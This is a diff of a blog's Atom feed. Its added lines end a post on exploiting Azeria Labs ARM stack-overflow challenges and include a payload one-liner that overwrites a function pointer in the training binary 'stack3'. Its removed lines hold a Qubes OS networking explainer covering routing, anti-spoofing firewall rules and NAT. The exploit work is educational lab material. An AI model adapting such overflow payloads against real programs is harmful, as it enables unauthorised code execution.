+the &lt;em&gt;epilogue&lt;/em&gt; of &lt;code class=&quot;highlighter-rouge&quot;&gt;win&lt;/code&gt; &lt;strong&gt;without&lt;/strong&gt; having executed its &lt;em&gt;prologue&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;label for=&quot;mn-31554f46753f568be15bed866ad590c3&quot; class=&quot;margin-toggle&quot;&gt; ⊕&lt;/label&gt;&lt;input type=&quot;checkbox&quot; id=&quot;mn-31554f46753f568be15bed866ad590c3&quot; class=&quot;margin-toggle&quot; /&gt;&lt;span class=&quot;marginnote&quot;&gt;Does this ring some bells? This is the base of &lt;em&gt;return oriented
+programming&lt;/em&gt; or ROP.
+ &lt;/span&gt;&lt;/p&gt;
+
+&lt;p&gt;The result? &lt;code class=&quot;highlighter-rouge&quot;&gt;pop {fp, pc}&lt;/code&gt; will restore &lt;code class=&quot;highlighter-rouge&quot;&gt;pc&lt;/code&gt; to the next element in the
+stack which most likely will not be a valid address. Happy segfault!&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pi@raspberrypi:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x84\x04\x01\x00'&lt;/span&gt; | ./stack3
+calling &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;pointer, jumping to 0x00010484
+code flow successfully changed
+Segmentation fault
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;!-- stuff --&gt;
+
+&lt;script&gt;
+function fix_asm_syntax(ev) {
+    // pip install selectq
+    //   cond = (val('text()') == 'blt') | (val('text()') == 'b') | (val('text()').startswith('mov')) | ...
+    //   div = sQ.select('div', attr('class').contains('language-nasm'))
+    //   xpath = div.select('span', cond)
+
+    // Make some instructions &quot;keywords&quot;
+    var xpath = &quot;.//div[contains(@class,'language-nasm')]//span[(((text() = 'blt') or (text() = 'b')) or starts-with(text(), 'mov')) or starts-with(text(), 'ldm') or starts-with(text(), 'stm') or starts-with(text(), 'ldr') or starts-with(text(), 'bx') or starts-with(text(), 'bl') or starts-with(text(), 'bne') or starts-with(text(), 'mvn') or starts-with(text(), 'beq')]&quot;;
+    var elems_iter = document.evaluate(xpath, document, null, XPathResult.ANY_TYPE, null);
+
+    var elems = [];
+    var el = elems_iter.iterateNext();
+    while (el) {
+        elems.push(el);
+        el = elems_iter.iterateNext();
+    }
+    for (var i = 0; i &lt; elems.length; i++) {
+        var el = elems[i];
+        el.classList.add('k'); // keyword
+        el.classList.remove('n'); // noun
+    }
+
+    // Remove the 'err' class
+    var xpath = &quot;.//div[contains(@class,'language-nasm')]//span[@class='err']&quot;
+    var elems_iter = document.evaluate(xpath, document, null, XPathResult.ANY_TYPE, null);
+
+    var elems = [];
+    var el = elems_iter.iterateNext();
+    while (el) {
+        elems.push(el);
+        el = elems_iter.iterateNext();
+    }
+    for (var i = 0; i &lt; elems.length; i++) {
+        var el = elems[i];
+        el.classList.remove('err'); // syntax error
+    }
+
+    // Remove the 'err' class
+    var xpath = &quot;.//div[contains(@class,'language-python')]//span[@class='err']&quot;
+    var elems_iter = document.evaluate(xpath, document, null, XPathResult.ANY_TYPE, null);
+
+    var elems = [];
+    var el = elems_iter.iterateNext();
+    while (el) {
+        elems.push(el);
+        el = elems_iter.iterateNext();
+    }
+    for (var i = 0; i &lt; elems.length; i++) {
+        var el = elems[i];
+        el.classList.remove('err'); // syntax error
+    }
+}
+
+document.addEventListener('DOMContentLoaded', fix_asm_syntax);
+&lt;/script&gt;</content><author><name>Gehn</name></author><summary type="html">This time the goal is to make the program print the message &quot;code flow successfully changed&quot;.</summary></entry><entry><title type="html">Smashing ARM Stack for Fun - Part III</title><link href="/book-of-gehn/articles/2021/01/18/Smashing-ARM-Stack-for-Fun-Part-III.html" rel="alternate" type="text/html" title="Smashing ARM Stack for Fun - Part III" /><published>2021-01-18T00:00:00+01:00</published><updated>2021-01-18T00:00:00+01:00</updated><id>/book-of-gehn/articles/2021/01/18/Smashing-ARM-Stack-for-Fun-Part-III</id><content type="html" xml:base="/book-of-gehn/articles/2021/01/18/Smashing-ARM-Stack-for-Fun-Part-III.html">&lt;p&gt;Another fast moving post
 about exploiting the &lt;a href=&quot;https://github.com/azeria-labs/ARM-challenges&quot;&gt;third Arm challenge&lt;/a&gt;&lt;!--more--&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;setup&quot;&gt;Setup&lt;/h2&gt;
@@ -445,7 +703,7 @@ will use &lt;a href=&quot;https://github.com/pwndbg/pwndbg&quot;&gt;pwndbg&lt;/a
 of &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt;.&lt;/p&gt;
 
 &lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gdb-multiarch &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; ~/scripts/pwndbg.gdbinit
-pwndbg&amp;gt; target extended-remote 9999
+pwndbg&amp;gt; target extended-remote :9999
 Remote debugging using &amp;lt;...&amp;gt;
 Reading /home/pi/stack0 from remote target...
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -2520,402 +2778,4 @@ found &lt;a href=&quot;https://github.com/torvalds/linux/commit/bf0bdd1343efbbf6
   &lt;li&gt;&lt;a href=&quot;https://blog.packagecloud.io/eng/2016/06/22/monitoring-tuning-linux-networking-stack-receiving-data/&quot;&gt;Monitoring and Tuning the Linux Networking Stack: Receiving Data&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://www.infradead.org/~mchehab/rst_conversion/networking/scaling.html&quot;&gt;Scaling in the Linux Networking Stack&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://www.kernel.org/doc/html/latest/networking/af_xdp.html&quot;&gt;Linux AF_XDP&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Gehn</name></author><summary type="html">⊕ Picture this: you’d been developing for six months a network sniffer using XDP, a kernel in-pass in Linux. Six months and when you are about to release it, you find not one but three bugs that shake all your understanding of XDP. A debugging race against the clock begins.</summary></entry><entry><title type="html">Qubes OS Networking</title><link href="/book-of-gehn/articles/2020/11/19/Qubes-Networking.html" rel="alternate" type="text/html" title="Qubes OS Networking" /><published>2020-11-19T00:00:00+01:00</published><updated>2020-11-19T00:00:00+01:00</updated><id>/book-of-gehn/articles/2020/11/19/Qubes-Networking</id><content type="html" xml:base="/book-of-gehn/articles/2020/11/19/Qubes-Networking.html">&lt;p&gt;&lt;a href=&quot;https://www.qubes-os.org/&quot;&gt;Qubes OS&lt;/a&gt; has an interesting network system
-to isolate more-or-less
-trusted &lt;em&gt;application&lt;/em&gt; virtual machines (App) from absolute untrusted
-&lt;em&gt;network&lt;/em&gt; VMs (Net).&lt;/p&gt;
-
-&lt;p&gt;&lt;label for=&quot;mf-892e94a4ec9e032aabff049c1567de9b&quot; class=&quot;margin-toggle  in-index-only&quot;&gt;⊕&lt;/label&gt;&lt;input type=&quot;checkbox&quot; id=&quot;mf-892e94a4ec9e032aabff049c1567de9b&quot; class=&quot;margin-toggle  in-index-only&quot; /&gt;&lt;span class=&quot;marginnote  in-index-only&quot;&gt;&lt;img style=&quot;&quot; class=&quot;fullwidth&quot; alt=&quot;IPs&quot; src=&quot;/book-of-gehn/assets/qubes/qubes-ips.png&quot; /&gt;  &lt;br /&gt;&lt;/span&gt;&lt;/p&gt;
-
-&lt;p&gt;These last ones have the drivers required to handle ethernet and wifi cards
-which expose them to a potentially deathly bug lurking in the drivers.&lt;/p&gt;
-
-&lt;p&gt;An additional VM is put in the middle between App VMs and Net VMs. This
-absolute trusted &lt;em&gt;proxy&lt;/em&gt; VM serves as a safe firewall (Proxy).&lt;/p&gt;
-
-&lt;p&gt;In this post will explore how these VMs connect and how the packets are
-forwarded up and down along this chain of VMs.&lt;!--more--&gt;&lt;/p&gt;
-
-&lt;figure&gt;&lt;figcaption&gt;&lt;span&gt;Three App VMs: one for work, other for personal stuff, both considered
-relatively-trusted and one more VM for untrusted stuff, all connected
-to the “firewall” VM which forwards the packets to the Net VM.
-&lt;br /&gt;
-The “firewall” VM is isolated except for
-the firewall/routing processing so it is considered trusted while Net VM
-is not.&lt;/span&gt;&lt;/figcaption&gt;&lt;img src=&quot;/book-of-gehn/assets/qubes/qubes-network.png&quot; /&gt;&lt;/figure&gt;
-
-&lt;h2 id=&quot;addresses&quot;&gt;Addresses&lt;/h2&gt;
-
-&lt;p&gt;The first obvious thing to notice is the existence of ethernet cards
-both in App VM and Proxy VM.&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@appvm:# ip address show
-2: eth0: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc mq state UP group default qlen 1000
-    &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt;/ether 00:16:3e:5e:6c:19 brd ff:ff:ff:ff:ff:ff
-    inet 10.137.7.27/32 brd 10.255.255.255 scope global eth0
-       valid_lft forever preferred_lft forever
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;hr class=&quot;slender post-layout small&quot; /&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@proxyvm:# ip address show
-2: eth0: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
-    &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt;/ether 00:16:3e:5e:6c:18 brd ff:ff:ff:ff:ff:ff
-    inet 10.137.1.26/32 brd 10.137.1.26 scope global eth0
-       valid_lft forever preferred_lft forever
-4: vif37.0: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 32
-    &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt;/ether fe:ff:ff:ff:ff:ff brd ff:ff:ff:ff:ff:ff
-    inet 10.137.7.1/32 scope global vif37.0
-       valid_lft forever preferred_lft forever
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;label for=&quot;mf-892e94a4ec9e032aabff049c1567de9b&quot; class=&quot;margin-toggle &quot;&gt;⊕&lt;/label&gt;&lt;input type=&quot;checkbox&quot; id=&quot;mf-892e94a4ec9e032aabff049c1567de9b&quot; class=&quot;margin-toggle &quot; /&gt;&lt;span class=&quot;marginnote &quot;&gt;&lt;img style=&quot;&quot; class=&quot;fullwidth&quot; alt=&quot;IPs&quot; src=&quot;/book-of-gehn/assets/qubes/qubes-ips.png&quot; /&gt;  &lt;br /&gt;&lt;/span&gt;&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;“The virtual interfaces in client VMs are called &lt;code class=&quot;highlighter-rouge&quot;&gt;ethX&lt;/code&gt;,
-and are provided by the &lt;code class=&quot;highlighter-rouge&quot;&gt;xen_netfront&lt;/code&gt; kernel module, and
-the corresponding interfaces in the Net/Proxy VM are
-called &lt;code class=&quot;highlighter-rouge&quot;&gt;vifX.Y&lt;/code&gt; and are created by the &lt;code class=&quot;highlighter-rouge&quot;&gt;xen_netback&lt;/code&gt; module.”
-&lt;br /&gt;–&lt;a href=&quot;https://theinvisiblethings.blogspot.com/2011/09/playing-with-qubes-networking-for-fun.html&quot;&gt;Playing with Qubes networking for fun&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;&lt;label for=&quot;mn-390925d166339968db0d24a04d1106cc&quot; class=&quot;margin-toggle&quot;&gt; ⊕&lt;/label&gt;&lt;input type=&quot;checkbox&quot; id=&quot;mn-390925d166339968db0d24a04d1106cc&quot; class=&quot;margin-toggle&quot; /&gt;&lt;span class=&quot;marginnote&quot;&gt;The most-right bit of the most-left byte (&lt;code class=&quot;highlighter-rouge&quot;&gt;fe&lt;/code&gt;) is even so it is an unicast address.
-&lt;br /&gt;
-The second most-right bit of the same byte is odd so it is a locally
-administrated address and it means that was arbitrary set by Qubes/Xen.
- &lt;/span&gt;&lt;/p&gt;
-
-&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;ethX&lt;/code&gt; links have different addresses with the same
-&lt;a href=&quot;https://hwaddress.com/company/xensource-inc/&quot;&gt;Xensource OUI&lt;/a&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;00:16:3e&lt;/code&gt;
-while the &lt;code class=&quot;highlighter-rouge&quot;&gt;vifX.Y&lt;/code&gt; have the same &lt;a href=&quot;https://en.wikipedia.org/wiki/MAC_address&quot;&gt;unicast-locally
-administrated&lt;/a&gt; MAC:
-&lt;code class=&quot;highlighter-rouge&quot;&gt;fe:ff:ff:ff:ff:ff&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h2 id=&quot;routing&quot;&gt;Routing&lt;/h2&gt;
-
-&lt;p&gt;Here a ping from the App VM is routed to the Proxy VM which
-in turns routes the packet to the Net VM and the outside world
-and the response goes back through the same path to the App VM&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@appvm:# ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 8.8.8.8
-64 bytes from 8.8.8.8: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;53 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;12.1 ms
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;hr class=&quot;slender post-layout small&quot; /&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@appvm:# tcpdump &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0
-23:56:57.072295 ARP, Request who-has 10.137.7.1 tell 10.137.7.27, length 28
-23:56:57.072330 ARP, Reply 10.137.7.1 is-at fe:ff:ff:ff:ff:ff, length 28
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;icmp omitted&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;hr class=&quot;slender post-layout small&quot; /&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@proxyvm:# tcpdump &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; vif37.0
-23:56:57.072295 ARP, Request who-has 10.137.7.1 tell 10.137.7.27, length 28
-23:56:57.072330 ARP, Reply 10.137.7.1 is-at fe:ff:ff:ff:ff:ff, length 28
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;icmp omitted&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;label for=&quot;mf-103c3d5b36df5f56ef8d5565c7424cb1&quot; class=&quot;margin-toggle &quot;&gt;⊕&lt;/label&gt;&lt;input type=&quot;checkbox&quot; id=&quot;mf-103c3d5b36df5f56ef8d5565c7424cb1&quot; class=&quot;margin-toggle &quot; /&gt;&lt;span class=&quot;marginnote &quot;&gt;&lt;img style=&quot;&quot; class=&quot;fullwidth&quot; alt=&quot;ARP&quot; src=&quot;/book-of-gehn/assets/qubes/qubes-arp.png&quot; /&gt;  &lt;br /&gt;&lt;/span&gt;&lt;/p&gt;
-
-&lt;p&gt;The ARP request/reply is the App VM asking for the MAC address
-of its configured gateway, the &lt;code class=&quot;highlighter-rouge&quot;&gt;10.137.7.1&lt;/code&gt; which it is the IP
-of the Proxy VM’s &lt;code class=&quot;highlighter-rouge&quot;&gt;vif37.0&lt;/code&gt; interface.&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@appvm:# ip route show
-default via 10.137.7.1 dev eth0
-10.137.7.1 dev eth0 scope &lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;label for=&quot;mn-65007ced5f26024b42b9ad52a272abfb&quot; class=&quot;margin-toggle&quot;&gt; ⊕&lt;/label&gt;&lt;input type=&quot;checkbox&quot; id=&quot;mn-65007ced5f26024b42b9ad52a272abfb&quot; class=&quot;margin-toggle&quot; /&gt;&lt;span class=&quot;marginnote&quot;&gt;You may find &lt;code class=&quot;highlighter-rouge&quot;&gt;REACHABLE&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;STALE&lt;/code&gt;:
-the first means that the entry is valid while the second
-means it &lt;em&gt;was&lt;/em&gt; valid.
-&lt;br /&gt;
-If you are quickly enough you may see &lt;code class=&quot;highlighter-rouge&quot;&gt;DELAY&lt;/code&gt;: the learning about the
-reachability is still in progress.
- &lt;/span&gt;&lt;/p&gt;
-
-&lt;p&gt;As expected, the App VM saves this in its ARP cache:&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@appvm:# ip neigh show
-10.137.7.1 dev eth0 lladdr fe:ff:ff:ff:ff:ff STALE
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;label for=&quot;mf-bd5111593d31e56a5d6665b921d712c7&quot; class=&quot;margin-toggle &quot;&gt;⊕&lt;/label&gt;&lt;input type=&quot;checkbox&quot; id=&quot;mf-bd5111593d31e56a5d6665b921d712c7&quot; class=&quot;margin-toggle &quot; /&gt;&lt;span class=&quot;marginnote &quot;&gt;&lt;img style=&quot;&quot; class=&quot;fullwidth&quot; alt=&quot;Ping&quot; src=&quot;/book-of-gehn/assets/qubes/qubes-first-part-ping.png&quot; /&gt;  &lt;br /&gt;&lt;/span&gt;&lt;/p&gt;
-
-&lt;p&gt;Once the App VM knows the Link Layer address (aka &lt;code class=&quot;highlighter-rouge&quot;&gt;lladdr&lt;/code&gt;), it sends
-the ICMP echo request, the Proxy VM &lt;em&gt;forwards&lt;/em&gt; it and forwards back
-the response.&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@appvm:# tcpdump &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;arp omitted&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-23:56:58.014156 IP 10.137.7.27 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 8.8.8.8: ICMP &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;request, &lt;span class=&quot;nb&quot;&gt;id &lt;/span&gt;1177, &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;1, length 64
-23:56:58.027402 IP 8.8.8.8 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 10.137.7.27: ICMP &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;reply, &lt;span class=&quot;nb&quot;&gt;id &lt;/span&gt;1177, &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;1, length 64
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;hr class=&quot;slender post-layout small&quot; /&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@proxyvm:# tcpdump &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; vif37.0
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;arp omitted&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-23:56:58.019581 IP 10.137.7.27 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 8.8.8.8: ICMP &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;request, &lt;span class=&quot;nb&quot;&gt;id &lt;/span&gt;1177, &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;1, length 64
-23:56:58.032679 IP 8.8.8.8 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 10.137.7.27: ICMP &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;reply, &lt;span class=&quot;nb&quot;&gt;id &lt;/span&gt;1177, &lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;1, length 64
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;upstream---downstream-forwarding&quot;&gt;Upstream - downstream forwarding&lt;/h2&gt;
-
-&lt;p&gt;The Proxy VM acts as a router.&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@proxyvm:# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /proc/sys/net/ipv4/ip_forward
-1
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;However the VM will &lt;em&gt;drop&lt;/em&gt; all the packets before forwarding them
-with some exceptions:&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@proxyvm:# iptables-save &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; raw
-:PREROUTING ACCEPT &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;116:43405]
-&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; PREROUTING &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 10.137.7.27/32 &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; vif37.0 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; DROP
-...
-
-root@proxyvm:# iptables-save &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; filter
-:FORWARD DROP &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0:0]
-...
-&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; FORWARD &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 10.137.7.27/32 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; icmp &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
-&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; FORWARD &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; 10.137.7.27/32 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;label for=&quot;mf-72598e6a47c6eff2d841e635a906ab83&quot; class=&quot;margin-toggle &quot;&gt;⊕&lt;/label&gt;&lt;input type=&quot;checkbox&quot; id=&quot;mf-72598e6a47c6eff2d841e635a906ab83&quot; class=&quot;margin-toggle &quot; /&gt;&lt;span class=&quot;marginnote &quot;&gt;&lt;img style=&quot;&quot; class=&quot;fullwidth&quot; alt=&quot;Spoofing&quot; src=&quot;/book-of-gehn/assets/qubes/qubes-spoofed.png&quot; /&gt;  &lt;br /&gt;The &lt;em&gt;untrusted&lt;/em&gt; VM spoofs the source address simulating a message
-&lt;em&gt;from the work&lt;/em&gt; VM; replies will be addresses to it.
-&lt;br /&gt;
-This spoofing scenario is prevented with the &lt;code class=&quot;highlighter-rouge&quot;&gt;PREROUTING&lt;/code&gt; rules.&lt;/span&gt;&lt;/p&gt;
-
-&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;PREROUTING&lt;/code&gt; rule prevents a malicious downstream VM (App VM) to send
-packets to a Proxy VM (via &lt;code class=&quot;highlighter-rouge&quot;&gt;vif37.0&lt;/code&gt;) with a spoofed source IP.&lt;/p&gt;
-
-&lt;p&gt;Otherwise a malicious VM could hijack the traffic of its &lt;em&gt;siblings&lt;/em&gt; VMs.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;blockquote&gt;
-    &lt;blockquote&gt;
-      &lt;p&gt;Proxy VM will act as a router for a particular App VM &lt;strong&gt;only&lt;/strong&gt;
-for the packets coming from &lt;strong&gt;that&lt;/strong&gt; VM.&lt;/p&gt;
-    &lt;/blockquote&gt;
-  &lt;/blockquote&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@proxyvm:# ip route show
-default via 10.137.1.1 dev eth0 proto static metric 100
-10.137.1.1 dev eth0 proto static scope &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;metric 100
-10.137.1.26 dev eth0 proto kernel scope &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;src 10.137.1.26 metric 100
-10.137.7.27 dev vif37.0 scope &lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;metric 32715
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;So the incoming ICMP echo request packet with source IP &lt;code class=&quot;highlighter-rouge&quot;&gt;10.137.7.27&lt;/code&gt;
-enters from &lt;code class=&quot;highlighter-rouge&quot;&gt;vif37.0&lt;/code&gt;, it is accepted by the firewall, routed to
-&lt;code class=&quot;highlighter-rouge&quot;&gt;eth0&lt;/code&gt; due the default route and goes out.&lt;/p&gt;
-
-&lt;p&gt;Before leaving the Proxy VM, the packet is slightly modified…&lt;/p&gt;
-
-&lt;h2 id=&quot;nat&quot;&gt;NAT&lt;/h2&gt;
-
-&lt;p&gt;The Proxy VM allows routing packets coming from its App VM: we see
-this in the firewall exceptions and in the route where the
-&lt;strong&gt;specific&lt;/strong&gt; App VM IP is used, &lt;code class=&quot;highlighter-rouge&quot;&gt;10.137.7.27&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;But if we have more Proxy VMs chained ?&lt;/p&gt;
-
-&lt;p&gt;Would the second Proxy VM need the IPs of the first Proxy VM and the
-App VM to setup its routes?&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;App VM &amp;lt;-&amp;gt; Proxy VM &amp;lt;-&amp;gt; another Proxy VM &amp;lt;-&amp;gt; ...
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;In general, any Proxy VM would need the IPs of all the downstream VMs!&lt;/p&gt;
-
-&lt;p&gt;That’s not only tedious but also would leak information: higher VMs
-would know more about the topology. A Net VM would know all the IPs
-that the environment has.&lt;/p&gt;
-
-&lt;p&gt;However sniffing on Proxy VM’s &lt;code class=&quot;highlighter-rouge&quot;&gt;eth0&lt;/code&gt; shows something different when
-the ping of App VM is forwarded:&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@proxyvm:# tcpdump &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;arp omitted&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
